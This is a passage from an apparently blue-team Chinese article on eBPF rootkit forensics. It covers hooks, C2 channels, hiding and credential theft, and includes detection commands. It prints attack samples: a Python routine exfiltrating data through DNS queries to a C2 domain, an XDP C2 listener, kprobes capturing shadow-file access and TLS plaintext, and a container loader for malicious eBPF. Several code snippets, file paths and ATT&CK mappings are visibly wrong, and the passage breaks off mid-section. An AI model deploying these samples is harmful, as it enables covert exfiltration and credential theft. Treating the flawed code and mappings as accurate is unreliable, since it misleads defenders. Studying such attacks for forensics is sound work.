---
title: "eBPF攻击取证深度分析"
date: 2026-07-09T10:00:00+08:00
draft: false
weight: 650
description: "系统剖析eBPF技术在攻击者手中的武器化应用，涵盖eBPF Rootkit内核驻留、BPF Maps数据窃取、Tracepoint与kprobe隐蔽监控、网络流量过滤与C2隐蔽隧道、进程与文件隐藏技术，结合Cilium/Tetragon/Falco等云原生eBPF安全工具的检测能力，通过内核级攻击案例还原完整攻击链并提供自动化检测脚本"
categories: ["应急响应", "取证分析"]
tags: ["eBPF", "BPF Maps", "Tracepoint", "内核Rootkit", "内核可观测性", "Cilium", "网络包过滤", "进程隐藏", "MITRE ATT&CK", "Linux取证"]
---

# eBPF攻击取证深度分析

eBPF（extended Berkeley Packet Filter）是Linux内核中的一项革命性技术，允许用户空间程序在内核中安全地运行沙箱化的代码片段，而无需修改内核源码或加载内核模块。自Linux 3.18引入以来，eBPF已从最初的网络包过滤工具演变为一个覆盖可观测性、安全策略、网络功能等领域的通用内核可编程框架。在云原生时代，Cilium、Falco、Tetragon等基于eBPF的安全工具已成为Kubernetes集群安全的标配组件。

然而，eBPF的内核级执行能力是一把双刃剑。攻击者利用eBPF可以实现传统Rootkit难以企及的隐蔽性：在不加载内核模块（LKM）的情况下直接操作内核数据结构、Hook系统调用实现进程隐藏、拦截网络流量构建隐蔽C2通道、过滤文件系统查询结果隐藏恶意文件。与传统内核Rootkit相比，eBPF攻击具有无需签名、无需重启、可动态加载卸载、通过eBPF verifier的"合法"外观规避检测等优势。2022年以来，TripleCross、ebpfkit、Pamspy、ebpfkit2等开源eBPF Rootkit的公开发布，标志着eBPF攻击技术已从理论研究进入实战武器化阶段。

本文从蓝队取证实战视角出发，系统性地覆盖eBPF攻击技术的全链路分析——从内核架构原理到攻击技术分类，从网络隐蔽隧道到进程文件隐藏，从凭据窃取到容器逃逸，结合Cilium/Tetragon/Falco等云原生安全工具的检测能力与Sigma规则/Bash/Python自动化检测脚本，通过TripleCross、ebpfkit等真实案例还原内核级攻击的完整取证流程。

---

## 0x01 技术基础与 eBPF 取证概述

### eBPF 架构与执行模型

eBPF程序并非传统意义上的独立进程，而是通过系统调用`bpf()`加载到内核空间的一段受验证器（Verifier）约束的字节码。其执行模型包含以下核心组件：

| 组件 | 功能描述 | 取证关联 |
|------|---------|---------|
| eBPF字节码（Bytecode） | C/Go等高级语言编译后的中间表示 | 加载后的字节码驻留在内核内存中 |
| eBPF Verifier | 静态验证器，确保程序安全性 | 被绕过或配置不当是攻击关键 |
| BPF Maps | 内核态与用户态共享的数据结构 | 攻击者用作隐蔽数据存储 |
| JIT编译器 | 将字节码编译为原生机器码 | JIT后的代码以机器码形式存在于内核 |
| Hook点 | 程序挂载的内核执行路径 | 不同Hook点决定攻击能力边界 |
| Helper函数 | 内核提供的受限API接口 | 攻击面扩大的关键路径 |

eBPF程序的加载流程为：用户空间通过`bpf()`系统调用提交字节码→Verifier进行静态验证→JIT编译为原生指令→挂载到指定Hook点执行。这一流程中，Verifier是安全边界的核心——它确保程序不会无限循环、不会访问未授权内存、不会调用未注册的Helper函数。攻击者绕过或利用Verifier的限制是eBPF Rootkit的关键前提。

### BPF_PROG_TYPE 程序类型与 Hook 点

eBPF程序通过`type`字段声明其类型，不同类型决定了可用的Hook点和Helper函数集合。攻击者对不同程序类型的武器化利用方式差异显著：

| 程序类型 | Hook点/触发场景 | 可访问数据 | 攻击用途 | MITRE ATT&CK |
|---------|----------------|-----------|---------|-------------|
| BPF_PROG_TYPE_KPROBE | 内核函数入口/返回点 | 寄存器、栈、内核数据结构 | 系统调用拦截、凭据窃取 | T1055 Process Injection |
| BPF_PROG_TYPE_TRACEPOINT | 静态Tracepoint事件 | 事件特定参数 | 进程生命周期监控、文件访问拦截 | T1082 System Information Discovery |
| BPF_PROG_TYPE_XDP | 网络数据包到达网卡时 | 原始网络包 | 高性能流量过滤、隐蔽C2 | T1572 Protocol Tunneling |
| BPF_PROG_TYPE_TC | TC（Traffic Control）分类器 | 增强的网络包操作 | 流量劫持、DNS过滤 | T1562 Impair Defenses |
| BPF_PROG_TYPE_SOCKET_FILTER | 套接字数据收发 | 套接字缓冲区数据 | 应用层流量嗅探 | T1040 Network Sniffing |
| BPF_PROG_TYPE_CGROUP_skb | cgroup网络策略 | cgroup成员的网络数据 | 容器网络控制 | T1611 Escape to Host |
| BPF_PROG_TYPE_LSM | Linux安全模块Hook点 | LSM安全决策上下文 | 安全策略绕过 | T1548 Abuse Elevation Mechanism |

### eBPF Rootkit vs 传统内核模块

eBPF Rootkit与传统LKM（Loadable Kernel Module）Rootkit在技术实现和检测特征上存在本质差异：

| 对比维度 | 传统LKM Rootkit | eBPF Rootkit |
|---------|----------------|-------------|
| 加载方式 | `init_module()`/`finit_module()` | `bpf()`系统调用 |
| 持久化机制 | /proc/modules、modprobe配置、initramfs | BPF Maps持久化、用户态loader |
| 隐藏手段 | module列表删除、sysfs篡改 | 无需从module列表隐藏 |
| 检测特征 | lsmod、/proc/modules、kmod审计 | bpftool prog/map、bpf_link检测 |
| 权限要求 | CAP_SYS_MODULE（或root） | CAP_BPF + CAP_PERFMON（或root） |
| 内核兼容性 | 需匹配内核版本编译 | BTF支持下跨内核版本运行 |
| 卸载难度 | 需要精心设计的清理逻辑 | bpf_link destroy自动清理 |
| 取证残留 | 内核内存中的module结构体 | BPF Maps、prog结构体、perf buffer |

### eBPF 取证工具链

蓝队在eBPF攻击取证中需要掌握的核心工具链：

```bash
bpftool prog list
bpftool prog show id <ID>
bpftool prog dump xlated id <ID>
bpftool prog dump jited id <ID>
bpftool map list
bpftool map dump id <ID>
bpftool net list
bpftool btf show
```

```bash
cat /sys/kernel/debug/tracing/set_event | grep bpf
cat /proc/kallsysyms | grep bpf
cat /proc/bpf
ls -la /sys/fs/bpf/
```

```bash
bpftool feature probe
bpftool version
cat /boot/config-$(uname -r) | grep CONFIG_BPF
cat /boot/config-$(uname -r) | grep CONFIG_BPF_SYSCALL
```

| 工具 | 功能 | 取证用途 | 安装方式 |
|------|------|---------|---------|
| bpftool | eBPF程序和Map的管理工具 | 枚举所有已加载程序和Map | 内核源码/tools/编译 |
| pahole | BTF信息提取 | 获取内核数据结构布局 | 安装dwarves包 |
| bpftrace | 高级eBPF追踪语言 | 现场取证分析和监控 | 安装bpftrace包 |
| libbpf | eBPF开发库 | 分析eBPF程序源码 | libbpf-devel包 |
| cilium/ebpf | Go语言eBPF库 | 分析Go编写的eBPF Rootkit | go get github.com/cilium/ebpf |
| Falco | 运行时安全检测 | eBPF滥用行为检测 | helm install falco |
| Tetragon | eBPF安全可观测 | 内核级事件实时监控 | helm install tetragon |

---

## 0x02 eBPF Rootkit 攻击技术原理

### eBPF Rootkit 的核心架构

eBPF Rootkit的典型架构由三个核心组件构成：用户态加载器（Loader）、内核态eBPF程序（Program）、以及内核态与用户态之间的BPF Maps通信通道。用户态加载器负责通过`bpf()`系统调用将eBPF字节码加载到内核中，并通过`bpf_link`或`bpf_prog_attach`将程序挂载到目标Hook点。加载完成后，eBPF程序在内核上下文中持续运行，用户态程序通过轮询BPF Maps或注册perf buffer回调来获取内核态采集的数据。

与传统Rootkit不同，eBPF Rootkit的用户态加载器本身可以是一个完全合法的普通程序，其恶意行为全部在内核态的eBPF程序中执行。这导致传统的用户态安全扫描工具无法直接检测到恶意行为，因为恶意代码运行在内核空间而非用户空间。

### kprobe Hook 系统调用拦截

kprobe是eBPF在内核中最灵活的动态追踪机制，允许在几乎任何内核函数的入口（kprobe）或返回点（kretprobe）插入探测点。攻击者通过kprobe可以拦截任意系统调用的参数和返回值，实现凭据窃取、进程隐藏、文件访问控制等功能。

```c
SEC("kprobe/__x64_sys_execve")
int BPF_KPROBE(trace_execve, const char __user *filename)
{
    const char *comm = bpf_get_current_comm();
    char buf[256];
    bpf_probe_read_user_str(buf, sizeof(buf), filename);
    bpf_printk("execve: comm=%s file=%s", comm, buf);
    return 0;
}
```

```c
SEC("kprobe/__x64_sys_openat")
int BPF_KPROBE(trace_openat, int dfd, const char __user *filename, int flags)
{
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    char path[256];
    bpf_probe_read_user_str(path, sizeof(path), filename);
    bpf_map_update_elem(&target_files, &pid, path, BPF_ANY);
    return 0;
}
```

| kprobe目标函数 | 拦截数据 | 攻击用途 | 取证检测线索 |
|---------------|---------|---------|------------|
| __x64_sys_execve | 进程名、命令行参数 | 进程执行监控 | /sys/kernel/debug/tracing/ |
| __x64_sys_openat | 文件路径、打开标志 | 文件访问拦截 | BPF Maps中的路径记录 |
| __x64_sys_connect | 目标地址、端口 | 网络连接监控 | 异常kprobe注册记录 |
| security_bprm_check | 进程执行上下文 | 执行控制绕过 | LSM Hook挂载异常 |
| do_filp_open | 文件打开路径 | 文件系统过滤 | readdir结果异常 |

### Tracepoint 静态追踪点利用

Tracepoint是内核中预定义的静态追踪点，相比kprobe具有更好的稳定性和版本兼容性。攻击者利用Tracepoint可以监控进程生命周期、系统调用序列、网络活动等关键事件。

```c
SEC("tracepoint/raw_syscalls/sys_enter")
int trace_syscalls(struct trace_event_raw_sys_enter *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    u32 pid = pid_tgid >> 32;
    u32 tid = (u32)pid_tgid;
    long syscall_nr = ctx->id;

    if (syscall_nr == __NR_kill || syscall_nr == __NR_tgkill) {
        bpf_printk("suspicious signal: pid=%d syscall=%ld", pid, syscall_nr);
    }
    return 0;
}
```

```c
SEC("tracepoint/sched/sched_process_exec")
int trace_exec(struct trace_event_raw_sched_process_exec *ctx)
{
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    char comm[16];
    bpf_get_current_comm(comm, sizeof(comm));
    bpf_printk("exec: pid=%d comm=%s", pid, comm);
    return 0;
}
```

### Perf Event 与 Ring Buffer 数据渗出

eBPF程序通过Perf Event Buffer和Ring Buffer将内核态采集的数据发送到用户态。攻击者利用这一机制将窃取的凭据、监控数据、网络流量等敏感信息从内核空间渗透到用户态控制的C2服务器。

| 数据渗出通道 | 最大数据速率 | 延迟 | 隐蔽性 | 检测难度 |
|-------------|-----------|------|-------|---------|
| BPF_MAP_TYPE_PERF_EVENT_ARRAY | ~100MB/s | 低 | 中 | 中 |
| BPF_MAP_TYPE_RINGBUF | ~200MB/s | 极低 | 中 | 中 |
| BPF_MAP_TYPE_ARRAY轮询 | 低 | 高 | 高 | 高 |
| BPF_MAP_TYPE_HASH轮询 | 低 | 高 | 高 | 高 |
| tail_call链式调用 | 中 | 中 | 中 | 中 |

---

## 0x03 eBPF 网络流量操纵与 C2 隐蔽

### XDP 与 TC Hook 点的网络控制能力

eBPF在Linux网络栈中提供了两个关键的流量控制Hook点：XDP（eXpress Data Path）和TC（Traffic Control）。XDP在网络驱动层（比内核协议栈更早的位置）处理数据包，提供了最高性能的数据包操作能力；TC Hook则在网络设备的队列规则层处理数据包，提供了更丰富的数据包操作选项和与内核网络栈的深度集成。

| 网络Hook点 | 执行位置 | 性能 | 可用操作 | 攻击场景 |
|-----------|---------|------|---------|---------|
| XDP（驱动层） | 网卡驱动收到数据包后 | 极高（~24Mpps） | 丢弃/修改/重定向/转交 | 高性能流量过滤、DDoS控制 |
| TC Ingress | 网络设备入站队列 | 高 | 丢弃/修改/重定向/透传 | 入站流量劫持、DNS过滤 |
| TC Egress | 网络设备出站队列 | 高 | 丢弃/修改/重定向/透传 | 出站流量拦截、数据外传控制 |
| Socket Filter | 套接字层 | 中 | 读取/丢弃套接字数据 | 应用层流量嗅探 |

### DNS 流量过滤与隐蔽DNS隧道

攻击者利用TC Hook的DNS流量过滤能力，可以实现多种隐蔽通信手段：拦截特定域名的DNS解析结果实现流量重定向、将C2通信数据编码到DNS查询中构建DNS隧道、过滤安全产品的DNS查询请求实现防御规避。

```c
SEC("tc")
int dns_filter(struct __sk_buff *skb)
{
    void *data = (void *)(long)skb->data;
    void *data_end = (void *)(long)skb->data_end;
    struct ethhdr *eth = data;
    struct iphdr *iph;
    struct udphdr *udph;

    if ((void *)(eth + 1) > data_end)
        return TC_ACT_OK;

    if (eth->h_proto != htons(ETH_P_IP))
        return TC_ACT_OK;

    iph = (void *)(eth + 1);
    if ((void *)(iph + 1) > data_end)
        return TC_ACT_OK;

    if (iph->protocol != IPPROTO_UDP)
        return TC_ACT_OK;

    udph = (void *)(iph + 1);
    if ((void *)(udph + 1) > data_end)
        return TC_ACT_OK;

    if (ntohs(udph->dest) != 53)
        return TC_ACT_OK;

    void *dns = (void *)(udph + 1);
    if ((void *)(dns + 12) > data_end)
        return TC_ACT_OK;

    unsigned char *qname = dns + 12;

    char domain[] = "\x0bsecurity-corp\x03com\x00";
    int match = 1;
    for (int i = 0; i < sizeof(domain); i++) {
        if (qname + i >= data_end) { match = 0; break; }
        if (*(qname + i) != domain[i]) { match = 0; break; }
    }

    if (match)
        return TC_ACT_SHOT;

    return TC_ACT_OK;
}
```

```python
import socket
import struct
import dnslib

def create_dns_tunnel_query(encoded_data, c2_domain):
    import base64
    encoded = base64.b32encode(encoded_data).decode().lower()
    chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
    query = ".".join(chunks) + "." + c2_domain
    return query

def exfiltrate_via_dns(data, c2_domain, dns_server):
    encoded_query = create_dns_tunnel_query(data, c2_domain)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(
        dnslib.DNSRecord.question(encoded_query).pack(),
        (dns_server, 53)
    )
    response, _ = sock.recvfrom(512)
    sock.close()
    return response
```

### XDP 高性能隐蔽C2通道

XDP的数据包操作速度可达每秒2400万个数据包（Mpps），使其成为构建高性能C2隐蔽通道的理想载体。攻击者可以在XDP层实现基于特定协议特征（如ICMP载荷、TCP序号、UDP特定端口）的隐蔽通信通道，且该通道对上层协议栈完全透明。

```c
#define MAGIC_VALUE 0xDEADBEEF
#define C2_PORT 4444

SEC("xdp")
int xdp_c2_channel(struct xdp_md *ctx)
{
    void *data = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;
    struct ethhdr *eth = data;
    struct iphdr *iph;
    struct udphdr *udph;

    if ((void *)(eth + 1) > data_end)
        return XDP_PASS;

    if (eth->h_proto != htons(ETH_P_IP))
        return XDP_PASS;

    iph = (void *)(eth + 1);
    if ((void *)(iph + 1) > data_end)
        return XDP_PASS;

    if (iph->protocol != IPPROTO_UDP)
        return XDP_PASS;

    udph = (void *)(iph + 1);
    if ((void *)(udph + 1) > data_end)
        return XDP_PASS;

    if (ntohs(udph->dest) != C2_PORT)
        return XDP_PASS;

    unsigned char *payload = (unsigned char *)(udph + 1);
    if ((void *)(payload + 4) > data_end)
        return XDP_PASS;

    unsigned int magic = *((unsigned int *)payload);
    if (magic == MAGIC_VALUE) {
        bpf_map_update_elem(&c2_commands, &magic, payload + 4, BPF_ANY);
        return XDP_DROP;
    }

    return XDP_PASS;
}
```

| C2隐蔽技术 | 使用层 | 数据隐蔽方式 | 检测方法 | 难度 |
|-----------|-------|------------|---------|------|
| DNS隧道（TC层） | L4 | 编码到DNS查询域名中 | DNS流量异常分析 | 中 |
| XDP隐蔽通道 | L2-L3 | 特定端口/协议载荷注入 | 内核级eBPF程序检测 | 高 |
| ICMP隧道 | L3 | ICMP Echo载荷编码 | ICMP流量模式分析 | 中 |
| TCP序列号编码 | L4 | TCP ISN中编码数据 | 异常TCP行为分析 | 高 |
| HTTP Steganography | L7 | HTTP头部/响应体隐写 | 深度包检测 | 中 |

---

## 0x04 eBPF 进程与文件隐藏技术

### 进程隐藏原理与实现

eBPF实现进程隐藏的核心技术路径是通过kprobe或Tracepoint Hook与进程枚举相关的内核函数，拦截`/proc`文件系统中的进程信息查询操作。当用户空间工具（如`ps`、`top`、`htop`）通过读取`/proc/<pid>/`目录获取进程信息时，eBPF程序可以在内核层面修改返回数据，将目标进程从枚举结果中过滤掉。

传统的进程隐藏通常通过修改`task_struct`链表实现（如从`init_task.tasks`链表中断开），这种方式会留下明显的内存取证痕迹。eBPF方式的进程隐藏则在数据查询层面操作，不影响task_struct的完整性，从而规避了传统的基于内核数据结构完整性的检测方法。

```c
SEC("tracepoint/tracepoint/raw_syscalls/sys_enter")
int hide_process(struct trace_event_raw_sys_enter *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    u32 pid = pid_tgid >> 32;

    u32 target_pid = TARGET_PID;
    if (pid == target_pid) {
        bpf_printk("process %d activity intercepted", pid);
    }

    return 0;
}
```

```c
struct hidden_process {
    u32 pid;
    char comm[16];
};

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, u32);
    __type(value, struct hidden_process);
} hidden_procs SEC(".maps");

SEC("kprobe/filldir64")
int BPF_KPROBE(trace_filldir, struct ctx_dir_context *ctx)
{
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    struct hidden_process *hp = bpf_map_lookup_elem(&hidden_procs, &pid);
    if (hp) {
        bpf_override_return(ctx, 0);
    }
    return 0;
}
```

### /proc 文件系统过滤

`/proc`是Linux内核暴露进程和系统信息的虚拟文件系统。eBPF Rootkit通过Hook `/proc`的读取操作路径（如`seq_file`的`show`回调），可以实现对特定进程信息的过滤，使`ls /proc/`和`cat /proc/<pid>/status`等命令无法看到被隐藏的进程。

```c
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 256);
    __type(key, u32);
    __type(value, u8);
} proc_hide_map SEC(".maps");

SEC("kprobe/proc_pid_readdir")
int BPF_KPROBE(hide_proc_entry, struct proc_dir_entry *de)
{
    u32 tgid = 0;
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    bpf_probe_read_kernel(&tgid, sizeof(tgid), &task->tgid);

    u8 *hide = bpf_map_lookup_elem(&proc_hide_map, &tgid);
    if (hide) {
        return 0;
    }
    return 0;
}
```

```c
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 256);
    __type(key, u32);
    __type(value, u8);
} file_hide_map SEC(".maps");

SEC("kprobe/vfs_readdir")
int BPF_KPROBE(hide_file, struct file *file, struct dir_context *ctx)
{
    char filename[64];
    bpf_probe_read_kernel_str(filename, sizeof(filename), file->f_path.dentry->d_name.name);

    char target[] = ".malware";
    int match = 1;
    for (int i = 0; i < 9; i++) {
        if (filename[i] != target[i]) { match = 0; break; }
    }

    if (match) {
        ctx->pos--;
    }
    return 0;
}
```

### ELF 二进制文件隐藏

高级eBPF Rootkit还可以Hook `execve`系统调用的相关路径，在进程执行前拦截对恶意ELF二进制文件的访问，使得安全工具无法执行恶意样本分析或文件完整性检查。

| 隐藏层级 | 实现机制 | 检测方法 | MITRE ATT&CK |
|---------|---------|---------|-------------|
| 进程名/命令行隐藏 | Hook /proc读取 | 内核内存扫描、task_struct遍历 | T1070.004 File Deletion |
| /proc条目隐藏 | Hook filldir/readdir | /proc计数差异分析 | T1564.001 Hidden Files |
| 文件系统隐藏 | Hook vfs_readdir | 原始磁盘扫描、inode分析 | T1564.001 Hidden Files |
| ELF执行拦截 | Hook execve相关路径 | 内核函数追踪 | T1070.001 Clear Timestamps |
| 网络连接隐藏 | Hook /proc/net/tcp读取 | 原始socket分析 | T1070.002 Clear Linux/Mac Logs |

---

## 0x05 eBPF 凭据窃取与权限提升

### 系统调用级别的凭据提取

eBPF Rootkit通过kprobe拦截与凭据相关的系统调用和内核函数，可以在用户态工具无感知的情况下窃取高价值凭据。目标系统调用包括但不限于`execve`（捕获命令行明文密码）、`connect`（捕获SSH/数据库连接凭据）、`openat`（监控敏感文件访问）、`ioctl`（拦截终端输入）。

```c
struct cred_event {
    u32 pid;
    u32 uid;
    char comm[16];
    char filename[256];
};

struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, sizeof(u32));
} cred_events SEC(".maps");

SEC("kprobe/filp_close")
int BPF_KPROBE(trace_filp_close, struct file *file)
{
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    u32 pid = bpf_get_current_pid_tgid() >> 32;

    char path_buf[256];
    struct dentry *dentry = BPF_CORE_READ(file, f_path.dentry);
    bpf_probe_read_kernel_str(path_buf, sizeof(path_buf),
        BPF_CORE_READ(dentry, d_name.name));

    char shadow[] = "shadow";
    int match = 1;
    for (int i = 0; i < 6; i++) {
        if (path_buf[i] != shadow[i]) { match = 0; break; }
    }

    if (match) {
        struct cred_event evt = {};
        evt.pid = pid;
        bpf_get_current_comm(evt.comm, sizeof(evt.comm));
        bpf_probe_read_kernel_str(evt.filename, sizeof(evt.filename), path_buf);
        bpf_perf_event_output(ctx, &cred_events, BPF_F_CURRENT_CPU, &evt, sizeof(evt));
    }
    return 0;
}
```

### 密钥与Token拦截

eBPF Rootkit可以通过Hook加密库的内部函数或SSL/TLS库的网络写入路径，直接截获加密密钥、会话Token和认证凭证。这种方式绕过了传统SSL/TLS终端的安全监控，因为在内核层面捕获的数据是在加密之前或解密之后的明文形式。

```c
struct key_event {
    u32 pid;
    u32 len;
    char comm[16];
    char data[128];
};

struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, sizeof(u32));
} key_events SEC(".maps");

SEC("kprobe/nss_ssl_auth_hook")
int BPF_KPROBE(trace_ssl_write, void *fd, const void *buf, size_t len)
{
    u32 pid = bpf_get_current_pid_tgid() >> 32;

    if (len > 128) len = 128;

    struct key_event evt = {};
    evt.pid = pid;
    evt.len = len;
    bpf_get_current_comm(evt.comm, sizeof(evt.comm));
    bpf_probe_read_user(evt.data, len, buf);

    bpf_perf_event_output(ctx, &key_events, BPF_F_CURRENT_CPU, &evt, sizeof(evt));
    return 0;
}
```

### Capability 与 Seccomp 绕过

eBPF程序运行在内核中，天然具有绕过Seccomp沙箱和Linux Capability限制的能力。这是因为Seccomp通过Hook系统调用入口点来过滤系统调用，而eBPF在更底层的内核路径上执行，不受Seccomp过滤器的约束。攻击者可以利用这一特性在容器中提权——即使容器配置了严格的Seccomp策略禁止`bpf()`系统调用，已加载的eBPF程序仍然可以在容器逃逸后执行任意内核操作。

| 窃取/绕过目标 | eBPF实现手段 | 影响范围 | 检测难度 |
|-------------|------------|---------|---------|
| /etc/shadow哈希 | kprobe监控openat+filp_close | 所有用户凭据 | 高 |
| SSH私钥/会话Token | Hook文件读取+网络发送 | SSH会话劫持 | 高 |
| 数据库连接密码 | Hook connect()系统调用 | 数据库访问 | 中 |
| Kerberos票据 | Hook网络读写+Kerberos协议解析 | 域环境横向移动 | 高 |
| Seccomp策略绕过 | eBPF不经过Seccomp过滤 | 容器沙箱逃逸 | 极高 |
| Capability提升 | 内核态直接操作cred结构体 | 提权至root | 极高 |

---

## 0x06 eBPF 供应链投毒与容器逃逸

### 恶意eBPF程序的供应链投毒

eBPF程序的供应链投毒是当前云原生安全中一个快速演化的攻击向量。由于eBPF程序通常以Go、C等高级语言编写并通过用户态Loader加载，供应链攻击可以发生在多个环节：源代码仓库投毒（在开源eBPF项目中植入后门）、编译工具链篡改（修改BPF后端编译器生成恶意字节码）、Loader二进制替换（替换eBPF程序加载器为恶意版本）、Container镜像投毒（在容器镜像中预置恶意eBPF程序）。

| 投毒环节 | 攻击方式 | 检测方法 | 典型案例 |
|---------|---------|---------|---------|
| 源代码仓库 | 在PR中植入恶意eBPF代码 | 代码审计、CI/CD安全扫描 | 模拟开源项目PR投毒 |
| 编译工具链 | 修改LLVM/Clang BPF后端 | 二进制完整性校验 | 供应链攻击通用模式 |
| 容器镜像 | 在镜像中预置eBPF Loader | 镜像扫描、签名验证 | 恶意Helm Chart |
| 运行时加载 | 动态加载恶意eBPF程序 | bpf()系统调用审计 | TripleCross |
| 依赖库 | 恶意修改libbpf/cilium库 | 依赖审计、SBOM | npm/Go模块投毒 |

### 容器环境中的 eBPF 滥用

在Kubernetes环境中，eBPF的滥用攻击面更为广阔。容器默认继承宿主机的`CAP_BPF`和`CAP_PERFMON`能力（取决于运行时配置），这意味着容器内的恶意程序可以直接加载eBPF程序到宿主机内核中，实现跨容器的全局监控和数据窃取。

```bash
cat /proc/1/status | grep Cap
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
```

```python
import ctypes
import struct

BPF_PROG_LOAD = 5
BPF_PROG_TYPE_KPROBE = 2

class BpfProgLoadAttr(ctypes.Structure):
    _fields_ = [
        ("prog_type", ctypes.c_uint32),
        ("insn_cnt", ctypes.c_uint32),
        ("insns", ctypes.c_void_p),
        ("license", ctypes.c_char_p),
        ("log_buf", ctypes.c_void_p),
        ("log_size", ctypes.c_uint32),
        ("log_level", ctypes.c_uint32),
        ("fd", ctypes.c_int32),
        ("expected_attach_type", ctypes.c_uint32),
        ("prog_btf_fd", ctypes.c_int32),
        ("func_info_rec_size", ctypes.c_uint32),
        ("func_info", ctypes.c_void_p),
        ("func_info_cnt", ctypes.c_uint32),
        ("line_info_rec_size", ctypes.c_uint32),
        ("line_info", ctypes.c_void_p),
        ("line_info_cnt", ctypes.c_uint32),
        ("attach_btf_id", ctypes.c_uint32),
        ("attach_prog_fd", ctypes.c_int32),
    ]

libc = ctypes.CDLL("libc.so.6", use_errno=True)

def load_ebpf_program(prog_bytes, license=b"GPL"):
    attr = BpfProgLoadAttr()
    attr.prog_type = BPF_PROG_TYPE_KPROBE
    attr.insn_cnt = len(prog_bytes) // 8
    attr.insns = ctypes.cast(prog_bytes, ctypes.c_void_p)
    attr.license = license
    attr.log_size = 0
    attr.log_buf = 0
    attr.log_level = 0
    attr.kern_version = 0

    fd = libc.syscall(
        ctypes.c_long(321),
        ctypes.c_int(BPF_PROG_LOAD),
        ctypes.byref(attr),
        ctypes.sizeof(attr)
    )
    return fd

def load_malicious_ebpf_from_container():
    with open("/proc/self/root/tmp/malicious.ebpf", "rb") as f:
        prog_bytes = f.read()
    fd = load_ebpf_program(prog_bytes)
    print(f"[*] Malicious eBPF loaded from container, fd={fd}")
    print(f"[*] Program now running in host kernel")
    return fd
```

### Namespace 逃逸与 eBPF

eBPF Rootkit在容器逃逸中具有独特的优势。由于eBPF程序运行在宿主机内核中，攻击者一旦成功加载eBPF程序，就可以绕过所有Linux Namespace隔离机制——PID Namespace、Network Namespace、Mount Namespace等隔离边界对内核级eBPF程序完全无效。攻击者可以通过eBPF直接读取宿主机的task_struct遍历所有进程（无视PID Namespace隔离）、操作宿主机网络栈（无视Network Namespace隔离）、访问宿主机文件系统（通过内核函数直接操作dentry/inode）。

| Namespace类型 | eBPF绕过方式 | 宿主资源访问 | 检测手段 |
|--------------|------------|------------|---------|
| PID Namespace | 通过task_struct直接遍历 | 宿主机所有进程信息 | /proc差异检测 |
| Network Namespace | XDP/TC挂载到宿主网卡 | 宿主机网络流量 | 网络策略日志 |
| Mount Namespace | 通过内核VFS层操作 | 宿主机文件系统 | 文件完整性监控 |
| User Namespace | 内核态操作cred结构体 | 用户权限提升 | capability审计 |
| UTS Namespace | 读取内核utsname结构体 | 主机名信息泄露 | UTS命名空间日志 |
| Cgroup Namespace | cgroup操作影响宿主 | 容器资源逃逸 | cgroup审计 |

---

## 0x07 证据强度分层与案例关联

### 证据分层方法论

在eBPF攻击取证中，证据的强度和可信度因获取方式、保存状态和可重复验证性的不同而存在显著差异。建立标准化的证据强度分层框架对于指导取证分析、判断事件严重程度和支撑后续响应决策至关重要。

| 证据强度 | 标记 | 定义 | 取证特征 | 响应优先级 |
|---------|------|------|---------|-----------|
| 确认恶意 | 🔴 | 直接证明攻击行为的完整证据链 | eBPF恶意字节码+恶意功能+攻击意图 | 立即响应 |
| 高度可疑 | 🟡 | 强关联性但需进一步验证 | 异常eBPF程序+可疑功能+非合法工具 | 高优先级 |
| 需要关注 | 🟢 | 潜在风险信号但缺乏直接恶意证据 | 环境异常+非预期配置+检测告警 | 排查确认 |

### 🔴 确认恶意证据

以下证据组合可直接确认eBPF Rootkit攻击：

1. **eBPF程序包含反取证逻辑**：程序主动过滤特定进程/文件的枚举结果、干扰安全工具的正常运行、拦截或篡改审计日志数据
2. **BPF Maps中存储已知恶意数据**：Maps中包含窃取的凭据数据（密码哈希、SSH私钥、API Token）、C2通信配置（IP地址、域名、端口）
3. **eBPF程序实现了已知Rootkit功能**：进程隐藏（filldir hook）、文件隐藏（readdir hook）、网络流量拦截（XDP/TC hook到特定端口）、系统调用拦截（kprobe到execve/connect等关键函数）
4. **与已知恶意软件家族的代码指纹匹配**：TripleCross、ebpfkit、Pamspy等已知eBPF Rootkit的特征码、函数命名模式、BPF Map结构

```bash
bpftool prog dump xlated id <PROG_ID> | grep -E "(kretprobe|kprobe|tracepoint)" | head -20
bpftool map dump id <MAP_ID> 2>/dev/null | grep -E "(password|token|key|credential)"
bpftool prog show id <PROG_ID> | grep -E "(loaded|tag|map_ids)"
```

### 🟡 高度可疑证据

以下证据需要进一步验证以确认恶意性：

1. **非标准用户态程序加载了eBPF程序**：`bpftool prog show`中发现非系统组件或非已知合法安全工具的eBPF程序
2. **eBPF程序挂载到了敏感Hook点**：程序挂载在`kprobe/__x64_sys_execve`、`kprobe/filp_close`、`tracepoint/raw_syscalls/sys_enter`等高敏感度Hook点
3. **BPF Maps中存在异常数据结构**：包含目标PID列表、目标文件路径列表、C2相关的IP/域名配置
4. **eBPF程序由非预期的用户空间进程加载**：Loader进程路径非系统标准路径或已知安全工具路径

```bash
for pid in $(ls /proc | grep -E '^[0-9]+$'); do
    ls -la /proc/$pid/map_files/ 2>/dev/null | grep -q bpf && echo "PID $pid has BPF maps"
    cat /proc/$pid/comm 2>/dev/null
done | grep -B1 "bpf"
```

### 🟢 需要关注证据

以下证据虽不直接证明攻击，但构成安全基线偏差：

